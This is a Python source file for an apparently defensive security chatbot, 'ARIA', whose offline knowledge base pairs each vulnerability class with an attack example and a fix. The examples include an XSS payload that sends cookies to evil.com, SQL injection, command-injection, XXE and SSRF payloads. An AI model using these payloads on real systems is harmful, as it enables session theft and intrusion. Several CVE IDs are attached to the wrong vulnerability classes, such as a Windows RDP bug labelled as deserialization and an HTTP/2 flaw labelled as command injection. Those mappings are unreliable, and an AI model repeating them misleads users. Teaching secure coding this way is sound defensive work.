# ai_agent.py
"""
ARIA — Autonomous Risk Intelligence Agent
==========================================
Online:  Gemini 1.5 Flash (google-generativeai)
Offline: Comprehensive rule-based engine — always works, zero quota needed

External APIs:
  • NVD API v2  — real-time CVE lookup     (optional key: NVD_API_KEY)
  • OSV.dev     — open source vuln lookup  (free, no key)
  • MITRE ATT&CK — offline technique mapping
"""

import json
import logging
import os
import re
from datetime import datetime
from typing import Optional

import requests

logger = logging.getLogger(__name__)

# ── Gemini init ───────────────────────────────────────────────────────────────
_GENAI_AVAILABLE = False
try:
    import google.generativeai as genai
    _api_key = os.environ.get("GEMINI_API_KEY", "").strip()
    if _api_key:
        genai.configure(api_key=_api_key)
        _GENAI_AVAILABLE = True
except Exception:
    pass

_NVD_KEY  = os.environ.get("NVD_API_KEY", "").strip()
_NVD_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

# ── Severity weights ──────────────────────────────────────────────────────────
_SEV_WEIGHT = {"critical": 10, "high": 7, "medium": 4, "low": 1, "info": 0}

# ── Comprehensive offline knowledge base ─────────────────────────────────────
_KB: dict[str, dict] = {
    "sql injection": {
        "cve": "CVE-2023-23397", "cwe": "CWE-89", "cvss": 9.8,
        "owasp": "A05:2025 Injection",
        "mitre": "T1190 Exploit Public-Facing Application",
        "attack": (
            "Attacker inputs `' OR 1=1 --` into a login field. "
            "The unsanitized query becomes `SELECT * FROM users WHERE user='' OR 1=1 -- AND pass=''`, "
            "returning all users and bypassing authentication."
        ),
        "impact": "Authentication bypass, data exfiltration, database destruction.",
        "fix": (
            "**Python:** `cursor.execute('SELECT * FROM t WHERE id=?', (user_id,))`\n"
            "**PHP:** `$stmt = $pdo->prepare('SELECT * FROM t WHERE id=?'); $stmt->execute([$id]);`\n"
            "**Java:** `PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM t WHERE id=?\"); ps.setInt(1, id);`"
        ),
        "tools": "sqlmap, Burp Suite Active Scanner",
    },
    "xss": {
        "cve": "CVE-2023-1829", "cwe": "CWE-79", "cvss": 7.4,
        "owasp": "A05:2025 Injection",
        "mitre": "T1059.007 JavaScript",
        "attack": (
            "Attacker injects `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` "
            "into a comment field. Every visitor's session cookie is sent to the attacker."
        ),
        "impact": "Session hijacking, credential theft, defacement, malware distribution.",
        "fix": (
            "**Python:** `from markupsafe import escape; safe = escape(user_input)`\n"
            "**JS:** use `textContent` not `innerHTML`\n"
            "**PHP:** `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`\n"
            "**CSP:** `Content-Security-Policy: default-src 'self'`"
        ),
        "tools": "OWASP ZAP, Burp Suite, XSStrike",
    },
    "command injection": {
        "cve": "CVE-2023-44487", "cwe": "CWE-78", "cvss": 10.0,
        "owasp": "A05:2025 Injection",
        "mitre": "T1059 Command and Scripting Interpreter",
        "attack": "Input `; cat /etc/passwd` is passed to `os.system('ping ' + user_input)` — OS command executes.",
        "impact": "Full system compromise, data exfiltration, ransomware deployment.",
        "fix": (
            "**Never** use `os.system()`, `eval()`, or `shell=True` with user input.\n"
            "**Python:** `subprocess.run(['ping', '-c', '1', host], shell=False)`\n"
            "Validate input against strict allowlist before any OS call."
        ),
        "tools": "Commix, Burp Suite",
    },
    "path traversal": {
        "cve": "CVE-2021-41773", "cwe": "CWE-22", "cvss": 9.1,
        "owasp": "A05:2025 Injection",
        "mitre": "T1083 File and Directory Discovery",
        "attack": "Request to `?file=../../../../etc/passwd` reads sensitive system files.",
        "impact": "Source code, configuration files, /etc/passwd, private keys exposed.",
        "fix": (
            "```python\nimport os\nsafe = os.path.basename(user_input)\nreal = os.path.realpath(os.path.join(BASE, safe))\n"
            "assert real.startswith(BASE), 'Path traversal detected'\n```"
        ),
        "tools": "Burp Suite, dirb",
    },
    "hardcoded credentials": {
        "cve": "CWE-798", "cwe": "CWE-798", "cvss": 9.1,
        "owasp": "A07:2025 Authentication Failures",
        "mitre": "T1552.001 Credentials In Files",
        "attack": "Developer commits `password = 'SuperSecret123'` to GitHub. Attacker finds it via `git log` or GitHub search.",
        "impact": "Full database access, API key abuse, account takeover.",
        "fix": (
            "```python\nimport os\nDB_PASS = os.environ.get('DB_PASSWORD')  # from .env\n```\n"
            "Use a secrets manager (Vault, AWS Secrets Manager) in production.\n"
            "Add `.env` to `.gitignore`. Use `git-secrets` or `truffleHog` to scan history."
        ),
        "tools": "truffleHog, git-secrets, Semgrep p/secrets",
    },
    "weak cryptography": {
        "cve": "CVE-2023-2650", "cwe": "CWE-327", "cvss": 6.5,
        "owasp": "A04:2025 Cryptographic Failures",
        "mitre": "T1110 Brute Force",
        "attack": "MD5 hash of password cracked with rainbow table in < 1 second using hashcat.",
        "impact": "Mass password cracking after database breach.",
        "fix": (
            "**Password hashing:** `import bcrypt; bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(12))`\n"
            "**Encryption:** Use AES-256-GCM via `cryptography` library\n"
            "**Hashing (non-password):** SHA-256 minimum, SHA-3 preferred\n"
            "**Never use:** MD5, SHA-1, DES, RC4 for security purposes"
        ),
        "tools": "hashcat, john the ripper",
    },
    "missing security headers": {
        "cve": "CWE-693", "cwe": "CWE-693", "cvss": 5.3,
        "owasp": "A02:2025 Security Misconfiguration",
        "mitre": "T1185 Browser Session Hijacking",
        "attack": "No X-Frame-Options → clickjacking embeds site in iframe. No HSTS → MITM strips HTTPS.",
        "impact": "Clickjacking, XSS, MITM attacks, MIME sniffing.",
        "fix": (
            "```apache\nHeader always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
            "Header always set Content-Security-Policy \"default-src 'self'\"\n"
            "Header always set X-Frame-Options \"DENY\"\n"
            "Header always set X-Content-Type-Options \"nosniff\"\n"
            "Header always set Referrer-Policy \"strict-origin-when-cross-origin\"\n```"
        ),
        "tools": "Mozilla Observatory, securityheaders.com",
    },
    "open redirect": {
        "cve": "CVE-2021-40531", "cwe": "CWE-601", "cvss": 6.1,
        "owasp": "A01:2025 Broken Access Control",
        "mitre": "T1566 Phishing",
        "attack": "Link `https://trusted.com/redirect?url=https://evil.com` redirects user to phishing page.",
        "impact": "Credential phishing, session token theft.",
        "fix": (
            "Only allow relative URLs for redirects:\n"
            "```python\nfrom urllib.parse import urlparse\n"
            "if not urlparse(url).netloc:  # relative URL only\n    return redirect(url)\n```"
        ),
        "tools": "Burp Suite",
    },
    "idor": {
        "cve": "CWE-639", "cwe": "CWE-639", "cvss": 8.1,
        "owasp": "A01:2025 Broken Access Control",
        "mitre": "T1087 Account Discovery",
        "attack": "Changing `/api/orders/1234` to `/api/orders/1235` returns another user's order.",
        "impact": "Mass data exfiltration, PII exposure, financial data leak.",
        "fix": (
            "Always verify ownership server-side:\n"
            "```python\norder = Order.get(id=order_id)\nif order.user_id != current_user.id:\n    abort(403)\n```\n"
            "Use indirect references (UUIDs) instead of sequential IDs."
        ),
        "tools": "Burp Suite Intruder, AuthMatrix",
    },
    "ssrf": {
        "cve": "CVE-2021-26855", "cwe": "CWE-918", "cvss": 9.1,
        "owasp": "A10:2025 SSRF",
        "mitre": "T1090 Proxy",
        "attack": "Input `http://169.254.169.254/latest/meta-data/` in a URL field fetches AWS metadata with IAM credentials.",
        "impact": "Cloud metadata access, internal network scanning, RCE via SSRF chains.",
        "fix": (
            "```python\nfrom ipaddress import ip_address\nimport socket\n"
            "parsed = urlparse(user_url)\nip = socket.gethostbyname(parsed.hostname)\n"
            "if ip_address(ip).is_private:\n    raise ValueError('SSRF blocked')\n```\n"
            "Use a strict allowlist of permitted domains."
        ),
        "tools": "Burp Suite, SSRFire",
    },
    "insecure deserialization": {
        "cve": "CVE-2019-0708", "cwe": "CWE-502", "cvss": 9.8,
        "owasp": "A08:2025 Integrity Failures",
        "mitre": "T1059 Command Execution",
        "attack": "Attacker sends crafted pickle payload → arbitrary Python code executes on server.",
        "impact": "Remote code execution, full server compromise.",
        "fix": (
            "**Never** deserialize untrusted data with `pickle`, `yaml.load()`, `marshal`.\n"
            "```python\nimport yaml\nyaml.safe_load(data)  # NOT yaml.load()\n```\n"
            "Use JSON for data exchange. Validate + sign serialized objects."
        ),
        "tools": "ysoserial, PHPGGC",
    },
    "xml injection": {
        "cve": "CVE-2019-0229", "cwe": "CWE-611", "cvss": 9.1,
        "owasp": "A05:2025 Injection",
        "mitre": "T1059 Command Execution",
        "attack": "XXE payload `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>` reads local files.",
        "impact": "Local file disclosure, SSRF, DoS via billion laughs.",
        "fix": (
            "```python\nfrom lxml import etree\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\n```\n"
            "Disable external entity processing in all XML parsers."
        ),
        "tools": "XXEinjector, Burp Suite",
    },
    "broken authentication": {
        "cve": "CWE-287", "cwe": "CWE-287", "cvss": 9.8,
        "owasp": "A07:2025 Authentication Failures",
        "mitre": "T1110 Brute Force",
        "attack": "No rate limiting on login → attacker runs credential stuffing with 100M leaked passwords.",
        "impact": "Mass account takeover.",
        "fix": (
            "• Implement rate limiting: Flask-Limiter `@limiter.limit('10/minute')`\n"
            "• Account lockout after 5 failed attempts\n"
            "• Require MFA for sensitive actions\n"
            "• Use bcrypt/argon2 for password hashing (never MD5/SHA1)\n"
            "• Implement CAPTCHA after 3 failures"
        ),
        "tools": "Hydra, Burp Suite Intruder",
    },
    "ssl": {
        "cve": "CVE-2022-3786", "cwe": "CWE-326", "cvss": 7.5,
        "owasp": "A04:2025 Cryptographic Failures",
        "mitre": "T1040 Network Sniffing",
        "attack": "TLS 1.0/1.1 susceptible to BEAST, POODLE attacks. Weak ciphers crackable.",
        "impact": "Traffic decryption, credential interception.",
        "fix": (
            "```apache\nSSLProtocol -all +TLSv1.2 +TLSv1.3\n"
            "SSLCipherSuite HIGH:!MD5:!RC4:!3DES:!EXPORT\n"
            "SSLHonorCipherOrder on\n```\n"
            "Reference: https://ssl-config.mozilla.org/"
        ),
        "tools": "SSL Labs, testssl.sh, nmap ssl-*",
    },
}

# ── OWASP Top 10 2025 reference ───────────────────────────────────────────────
_OWASP_TOP10 = """## OWASP Top 10 — 2025

| # | Category | Risk | Key Vulns |
|---|----------|------|-----------|
| A01 | Broken Access Control | CRITICAL | IDOR, path traversal, privilege escalation |
| A02 | Security Misconfiguration | HIGH | Missing headers, default creds, verbose errors |
| A03 | Software Supply Chain | HIGH | Malicious packages, outdated deps with CVEs |
| A04 | Cryptographic Failures | HIGH | Weak ciphers, MD5/SHA1 passwords, no HTTPS |
| A05 | Injection | CRITICAL | SQLi, XSS, Command Injection, XXE, SSTI |
| A06 | Insecure Design | HIGH | Missing rate limits, no defense in depth |
| A07 | Authentication Failures | CRITICAL | Brute-force, session fixation, weak passwords |
| A08 | Integrity Failures | HIGH | Insecure deserialization, unsigned updates |
| A09 | Logging Failures | MEDIUM | No audit trail, sensitive data in logs |
| A10 | SSRF | HIGH | Cloud metadata, internal network scanning |

Source: https://owasp.org/Top10/"""

# ── CVSS scoring guide ────────────────────────────────────────────────────────
_CVSS_GUIDE = """## CVSS v3.1 Severity Levels

| Score | Severity | Action Required |
|-------|----------|-----------------|
| 9.0–10.0 | **CRITICAL** | Patch immediately — exploitable remotely, no auth |
| 7.0–8.9 | **HIGH** | Fix within 24–48 hours |
| 4.0–6.9 | **MEDIUM** | Fix within 2 weeks |
| 0.1–3.9 | **LOW** | Fix when possible, monitor |
| 0.0 | **INFO** | Informational only |

**Key CVSS metrics:**
- **AV:N** (Attack Vector Network) — remotely exploitable
- **AC:L** (Attack Complexity Low) — easy to exploit
- **PR:N** (Privileges Required None) — no login needed
- **UI:N** (User Interaction None) — no victim interaction
- **C/I/A: H** — High impact on Confidentiality/Integrity/Availability"""


class ARIA:
    """Autonomous Risk Intelligence Agent — Gemini online + full offline fallback."""

    def __init__(self):
        self.ai_active    = False
        self.model        = None
        self.chat_history: list[dict] = []

        if _GENAI_AVAILABLE:
            try:
                self.model     = genai.GenerativeModel("gemini-1.5-flash")
                self.ai_active = True
                logger.info("ARIA online — Gemini 1.5 Flash")
            except Exception as exc:
                logger.warning("ARIA: Gemini init failed (%s) — offline mode", exc)
        else:
            logger.info("ARIA offline — set GEMINI_API_KEY to enable online mode")

    # ── Gemini ────────────────────────────────────────────────────────────────

    def _gemini(self, prompt: str, system: str = "") -> Optional[str]:
        if not self.ai_active or not self.model:
            return None
        try:
            full = f"{system}\n\n{prompt}" if system else prompt
            return self.model.generate_content(full).text
        except Exception as exc:
            logger.warning("ARIA Gemini failed: %s", exc)
            return None

    # ── NVD CVE lookup ────────────────────────────────────────────────────────

    def lookup_cve(self, cve_id: str) -> dict:
        """Real-time NVD API v2 lookup for a CVE ID."""
        headers = {"apiKey": _NVD_KEY} if _NVD_KEY else {}
        try:
            r = requests.get(_NVD_BASE, params={"cveId": cve_id}, headers=headers, timeout=8)
            if r.status_code != 200:
                return {}
            vuln = r.json().get("vulnerabilities", [{}])[0].get("cve", {})
            desc = next((d["value"] for d in vuln.get("descriptions", []) if d.get("lang") == "en"), "")
            m    = vuln.get("metrics", {})
            cd   = (
                (m.get("cvssMetricV31") or [{}])[0].get("cvssData", {}) or
                (m.get("cvssMetricV30") or [{}])[0].get("cvssData", {}) or
                (m.get("cvssMetricV2")  or [{}])[0].get("cvssData", {})
            )
            return {
                "id":          cve_id,
                "description": desc,
                "cvss_score":  cd.get("baseScore"),
                "severity":    cd.get("baseSeverity"),
                "vector":      cd.get("vectorString"),
                "published":   vuln.get("published", "")[:10],
            }
        except Exception as exc:
            logger.debug("NVD lookup error for %s: %s", cve_id, exc)
            return {}

    # ── Chat ──────────────────────────────────────────────────────────────────

    def chat(self, message: str, context: Optional[dict] = None) -> str:
        """Cybersecurity Q&A. Gemini first, comprehensive offline fallback."""
        ctx = context or {}

        if self.ai_active:
            system = (
                "You are ARIA, an expert cybersecurity AI assistant for the CyBrain security platform. "
                "Answer questions about web security, network security, OWASP Top 10 2025, "
                "CVEs, exploit techniques, secure coding, and vulnerability remediation. "
                "Always provide: attack explanation, real-world impact, and concrete code fix examples. "
                "Format responses in Markdown with code blocks. Be technical and precise."
            )
            history = "".join(
                f"User: {t['q']}\nARIA: {t['a']}\n\n"
                for t in self.chat_history[-4:]
            )
            ctx_note = ""
            if ctx:
                ctx_note = (
                    f"\n\nActive scan context — target: {ctx.get('target','N/A')} | "
                    f"risk: {ctx.get('risk','N/A')} | findings: {ctx.get('total',0)}"
                )
            result = self._gemini(f"{history}User: {message}{ctx_note}", system=system)
            if result:
                self.chat_history.append({"q": message, "a": result})
                return result

        reply = self._offline(message.lower(), ctx)
        self.chat_history.append({"q": message, "a": reply})
        return reply

    def _offline(self, msg: str, ctx: dict) -> str:
        # CVE lookup
        cve_match = re.search(r"cve-(\d{4}-\d+)", msg, re.IGNORECASE)
        if cve_match:
            cve_id = f"CVE-{cve_match.group(1).upper()}"
            data   = self.lookup_cve(cve_id)
            if data:
                score = data.get('cvss_score', 'N/A')
                sev   = data.get('severity', 'N/A')
                return (
                    f"## {cve_id}\n\n"
                    f"**CVSS:** {score} {sev}\n"
                    f"**Published:** {data.get('published','N/A')}\n"
                    f"**Vector:** `{data.get('vector','N/A')}`\n\n"
                    f"**Description:** {data.get('description','N/A')}\n\n"
                    f"**Reference:** https://nvd.nist.gov/vuln/detail/{cve_id}"
                )
            return f"No NVD data found for {cve_id}. Check https://nvd.nist.gov/vuln/detail/{cve_id}"

        # Scan context explanation
        if ctx and any(k in msg for k in ["explain", "finding", "result", "scan", "vuln", "found", "what"]):
            return self._explain_context(ctx)

        # Knowledge base lookup
        for key, kb in _KB.items():
            if key in msg or key.replace(" ", "") in msg.replace(" ", ""):
                return self._kb_response(key, kb)

        # OWASP
        if "owasp" in msg:
            return _OWASP_TOP10

        # CVSS
        if any(k in msg for k in ["cvss", "severity", "score", "critical", "rating"]):
            return _CVSS_GUIDE

        # Headers
        if any(k in msg for k in ["header", "hsts", "csp", "x-frame", "cors", "security header"]):
            return _KB["missing security headers"]["fix"] + "\n\n**Test:** https://securityheaders.com"

        # SSL/TLS
        if any(k in msg for k in ["ssl", "tls", "https", "certificate", "cipher"]):
            return _KB["ssl"]["fix"]

        # Apache hardening
        if any(k in msg for k in ["apache", "httpd", "nginx", "server config"]):
            return (
                "## Server Hardening\n\n"
                "```apache\n"
                "# Apache\nServerTokens Prod\nServerSignature Off\n"
                "Options -Indexes -ExecCGI\nTraceEnable Off\n"
                "SSLProtocol -all +TLSv1.2 +TLSv1.3\n"
                "LimitRequestBody 10485760\n"
                "Header always set X-Frame-Options DENY\n"
                "Header always set X-Content-Type-Options nosniff\n"
                "```\n\n"
                "```nginx\n"
                "# Nginx\nserver_tokens off;\n"
                "add_header X-Frame-Options DENY;\n"
                "add_header X-Content-Type-Options nosniff;\n"
                "ssl_protocols TLSv1.2 TLSv1.3;\n"
                "ssl_prefer_server_ciphers on;\n"
                "```"
            )

        # Authentication
        if any(k in msg for k in ["auth", "login", "password", "session", "mfa", "totp", "2fa"]):
            return _KB["broken authentication"]["fix"]

        # Tools list
        if any(k in msg for k in ["tool", "zap", "nikto", "nmap", "burp", "scanner"]):
            return (
                "## CyBrain Integrated Security Tools\n\n"
                "| Tool | Type | Purpose | Install |\n"
                "|------|------|---------|--------|\n"
                "| **OWASP ZAP** | DAST | Active web scanning | Free: zaproxy.org |\n"
                "| **Nikto** | DAST | Web server scanner | `apt install nikto` |\n"
                "| **Nmap** | Network | Port scan + NSE vulns | nmap.org |\n"
                "| **Bandit** | SAST | Python code analysis | `pip install bandit` |\n"
                "| **Semgrep** | SAST | Multi-language analysis | `pip install semgrep` |\n"
                "| **pip-audit** | Deps | Python vulnerability scan | `pip install pip-audit` |\n"
                "| **npm audit** | Deps | Node.js vuln scan | bundled with npm |\n\n"
                "**External APIs (free):**\n"
                "- SSL Labs — full TLS grade\n"
                "- Mozilla Observatory — header analysis\n"
                "- Shodan InternetDB — IP intelligence\n"
                "- OSV.dev — open source vuln DB\n"
                "- NVD API — CVE details"
            )

        # Network security
        if any(k in msg for k in ["port", "network", "firewall", "smb", "rdp", "ssh"]):
            return (
                "## Network Security — Critical Ports\n\n"
                "| Port | Service | Risk | Action |\n"
                "|------|---------|------|--------|\n"
                "| 22 | SSH | HIGH | Key auth only, disable password auth |\n"
                "| 23 | Telnet | CRITICAL | Disable — use SSH |\n"
                "| 3389 | RDP | HIGH | VPN-only, enable NLA |\n"
                "| 3306 | MySQL | HIGH | Bind to 127.0.0.1 |\n"
                "| 6379 | Redis | CRITICAL | requirepass + bind 127.0.0.1 |\n"
                "| 27017 | MongoDB | CRITICAL | Enable --auth |\n"
                "| 445 | SMB | CRITICAL | Patch EternalBlue (MS17-010) |\n"
                "| 5432 | PostgreSQL | HIGH | Restrict pg_hba.conf |\n"
                "| 9200 | Elasticsearch | CRITICAL | Enable X-Pack security |"
            )

        # Report / explain
        if any(k in msg for k in ["report", "explain", "summary", "remediat"]):
            return self._explain_context(ctx) if ctx else (
                "Share scan results first (run a scan), then ask me to explain the findings."
            )

        # General help
        return (
            "## ARIA Security Assistant — Offline Mode\n\n"
            "I can help with:\n\n"
            "**Vulnerabilities (full attack + fix):**\n"
            "- SQL Injection, XSS, Command Injection, Path Traversal\n"
            "- SSRF, IDOR, XXE, Insecure Deserialization\n"
            "- Broken Authentication, Hardcoded Credentials\n"
            "- Weak Cryptography, Missing Security Headers\n\n"
            "**Standards & Reference:**\n"
            "- `owasp` — OWASP Top 10 2025\n"
            "- `cvss` — Severity scoring guide\n"
            "- `CVE-YYYY-NNNNN` — Real-time NVD CVE lookup\n\n"
            "**Configuration:**\n"
            "- `apache hardening`, `nginx config`\n"
            "- `ssl tls`, `security headers`\n"
            "- `authentication`, `mfa`\n\n"
            "**Tools:**\n"
            "- `tools list` — all integrated security tools\n\n"
            "Ask me anything about security!"
        )

    def _kb_response(self, key: str, kb: dict) -> str:
        title = key.replace("_", " ").title()
        return (
            f"## {title}\n\n"
            f"**CVE:** {kb.get('cve','N/A')} | "
            f"**CWE:** {kb.get('cwe','N/A')} | "
            f"**CVSS:** {kb.get('cvss','N/A')} | "
            f"**OWASP:** {kb.get('owasp','N/A')}\n\n"
            f"**MITRE ATT&CK:** {kb.get('mitre','N/A')}\n\n"
            f"### Attack Scenario\n{kb.get('attack','N/A')}\n\n"
            f"### Impact\n{kb.get('impact','N/A')}\n\n"
            f"### Fix\n{kb.get('fix','N/A')}\n\n"
            f"**Detection Tools:** {kb.get('tools','N/A')}"
        )

    def _explain_context(self, ctx: dict) -> str:
        total  = ctx.get("total", 0)
        risk   = str(ctx.get("risk", "unknown")).lower()
        target = ctx.get("target", "target")
        if total == 0:
            return (
                f"## Scan Complete — {target}\n\n"
                "**No vulnerabilities found.** This could mean:\n"
                "1. The target is well-secured ✓\n"
                "2. The scan was passive — run DAST for active testing\n"
                "3. WAF or CDN may be blocking probes\n\n"
                "**Recommendation:** Run a DAST scan with OWASP ZAP for deeper analysis."
            )
        urgency = {
            "critical": "⚠️ **IMMEDIATE ACTION REQUIRED** — Critical vulnerabilities are actively exploitable.",
            "high":     "🔴 **Fix within 24–48 hours.** High-severity issues present serious risk.",
            "medium":   "🟡 Fix within 2 weeks. Address in the next release cycle.",
            "low":      "🟢 Fix when convenient. Minor improvements recommended.",
        }.get(risk, "Review all findings below.")
        return (
            f"## Security Assessment — {target}\n\n"
            f"**Findings:** {total} | **Highest Risk:** {risk.upper()}\n\n"
            f"{urgency}\n\n"
            "**Recommended Actions:**\n"
            "1. Address CRITICAL and HIGH findings immediately\n"
            "2. Review each finding's remediation steps\n"
            "3. Re-scan after applying fixes\n"
            "4. Export the full report for documentation and compliance\n\n"
            "*Ask me about any specific vulnerability for a detailed attack scenario and fix.*"
        )

    # ── Findings analysis ─────────────────────────────────────────────────────

    def analyze_findings(self, findings: list, target: str, scan_type: str = "web") -> str:
        """Generate executive security report. Gemini first, offline fallback."""
        if not findings:
            return "## No Findings\n\nScan completed — zero vulnerabilities detected."

        if self.ai_active:
            system = (
                "You are ARIA, a senior penetration tester writing an executive security report. "
                "Be precise, technical, and action-oriented. Format as professional Markdown. "
                "Include: executive summary, top 5 prioritized remediation steps with code examples, "
                "compliance impact (GDPR/PCI-DSS/ISO 27001), and a security score out of 100."
            )
            prompt = (
                f"Target: {target}\nScan type: {scan_type}\n"
                f"Findings ({len(findings)} total):\n"
                f"{json.dumps(findings[:25], indent=2, ensure_ascii=False)[:6000]}\n\n"
                "Write a comprehensive security assessment report."
            )
            result = self._gemini(prompt, system=system)
            if result:
                return result

        return self._offline_report(findings, target, scan_type)

    def _offline_report(self, findings: list, target: str, scan_type: str) -> str:
        counts: dict[str, int] = {}
        for f in findings:
            sev = (f.get("severity") or "info").lower()
            counts[sev] = counts.get(sev, 0) + 1

        total_w = sum(_SEV_WEIGHT.get((f.get("severity") or "info").lower(), 0) for f in findings)
        score   = max(0, 100 - min(total_w * 2, 95))
        risk    = next((s for s in ("critical","high","medium","low") if counts.get(s,0)>0), "info")
        now     = datetime.now().strftime("%Y-%m-%d %H:%M UTC")

        # Top 5 prioritized fixes
        seen, fixes = set(), []
        for sev in ("critical","high","medium","low"):
            for f in findings:
                if (f.get("severity") or "info").lower() != sev:
                    continue
                title = f.get("title", f.get("check", "Unknown"))[:60]
                if title in seen:
                    continue
                seen.add(title)
                # Find fix in KB
                fix_text = "Review finding details and apply the indicated remediation."
                for kb_key, kb in _KB.items():
                    if kb_key in title.lower():
                        fix_text = kb["fix"][:300]
                        break
                fixes.append(
                    f"**{len(fixes)+1}. [{sev.upper()}] {title}**\n"
                    f"```\n{fix_text}\n```"
                )
                if len(fixes) >= 5:
                    break
            if len(fixes) >= 5:
                break

        # Compliance
        crit  = counts.get("critical", 0) > 0
        high  = counts.get("high", 0) > 0
        gdpr  = "❌ VIOLATION RISK" if crit else "⚠️ Review Required"
        pci   = "❌ FAIL"           if crit or high else "⚠️ Review"
        iso   = "❌ NON-CONFORMITY" if high else "⚠️ Minor Gaps"

        score_label = (
            "🟢 Excellent"          if score >= 90 else
            "🟡 Good — fix HIGH"    if score >= 70 else
            "🟠 Significant gaps"   if score >= 50 else
            "🔴 Critical posture"
        )

        lines = [
            f"# Security Report — {target}",
            f"**Date:** {now} | **Scan:** {scan_type.upper()} | **Risk:** {risk.upper()}",
            "", "---", "",
            "## Executive Summary",
            f"Security assessment identified **{len(findings)}** finding(s): "
            f"{counts.get('critical',0)} Critical · "
            f"{counts.get('high',0)} High · "
            f"{counts.get('medium',0)} Medium · "
            f"{counts.get('low',0)} Low.",
            "",
            "## Top Priority Remediation Steps", "",
        ] + fixes + [
            "",
            "## Compliance Impact",
            "| Standard | Status |",
            "|----------|--------|",
            f"| GDPR      | {gdpr} |",
            f"| PCI-DSS   | {pci}  |",
            f"| ISO 27001 | {iso}  |",
            "",
            "## Security Score",
            f"**{score}/100** — {score_label}",
            "",
            "*Full technical details are in the scan report. "
            "Ask ARIA about any specific vulnerability for remediation guidance.*",
        ]
        return "\n".join(lines)


# ── Singleton ─────────────────────────────────────────────────────────────────
_aria: Optional[ARIA] = None


def get_aria() -> ARIA:
    global _aria
    if _aria is None:
        _aria = ARIA()
    return _aria
